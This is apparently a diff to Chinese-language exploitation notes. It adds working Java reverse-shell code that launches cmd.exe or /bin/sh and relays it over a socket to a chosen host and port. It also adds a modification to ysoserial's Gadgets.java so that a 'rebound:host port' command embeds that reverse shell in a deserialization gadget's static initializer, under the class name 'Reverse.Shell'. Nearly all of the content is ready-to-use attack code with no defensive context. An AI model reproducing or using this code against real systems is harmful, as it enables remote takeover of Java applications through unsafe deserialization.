@@ -29,3 +29,56 @@ public class 10837093162496 extends AbstractTranslet {
    }
 }
 ```
+
+## 反弹shell
+
+```
+String host = "127.0.0.1";
+int port = 4444;
+String[] cmd = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe"} : new String[]{"/bin/sh"};
+Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s = new Socket(host, port);
+InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+while (!s.isClosed()) {
+    while (pi.available() > 0) so.write(pi.read());
+    while (pe.available() > 0) so.write(pe.read());
+    while (si.available() > 0) po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+    try {
+        p.exitValue();
+        break;
+    } catch (Exception e) {
+    }
+}
+;
+p.destroy();
+s.close();
+```
+
+## ys 改造反弹shell
+
+修改 `ysoserial/payloads/util/Gadgets.java`
+
+```
+        // run command in static initializer
+        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
+        String cmd = "";
+        if (command.startsWith("rebound:")) {
+            String[] cmds = command.substring(8).split(" ");
+            String host = cmds[0];
+            String port = cmds[1];
+            cmd = "String host=\""+host+"\";int port="+port+";String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\"} : new String[]{\"/bin/sh\"};Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();java.net.Socket s = new java.net.Socket(host, port);java.io.InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();java.io.OutputStream po = p.getOutputStream(), so = s.getOutputStream();while (!s.isClosed()) {while (pi.available() > 0) {so.write(pi.read());}while (pe.available() > 0) {so.write(pe.read());}while (si.available() > 0) {po.write(si.read());}so.flush();po.flush();try {p.exitValue();break;} catch (Exception e) {}}p.destroy();s.close();";
+        }else {
+            cmd = "java.lang.Runtime.getRuntime().exec(\"" +
+                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                "\");";
+        }
+        clazz.makeClassInitializer().insertAfter(cmd);
+        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
+        clazz.setName("Reverse.Shell" + System.nanoTime());
+        CtClass superC = pool.get(abstTranslet.getName());
+        clazz.setSuperclass(superC);
+```
